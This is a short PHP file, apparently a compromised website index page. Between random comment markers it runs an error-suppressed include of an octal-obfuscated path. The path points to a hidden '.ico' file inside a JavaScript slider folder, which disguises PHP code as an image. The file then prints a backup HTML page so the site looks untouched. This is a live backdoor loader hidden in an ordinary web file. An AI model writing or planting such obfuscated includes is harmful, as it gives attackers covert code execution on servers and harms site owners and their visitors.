<?php




/*ecf7a*/

@include "\057h\157m\145/\154i\166e\164e\163t\160r\157j\145c\164s\057p\165b\154i\143_\150t\155l\057s\153a\151p\150e\162/\152s\057m\165l\164i\163c\162o\154l\055s\154i\144e\162/\056f\1425\0627\066a\146.\151c\157";

/*ecf7a*/


echo @file_get_contents('index.html.bak.bak');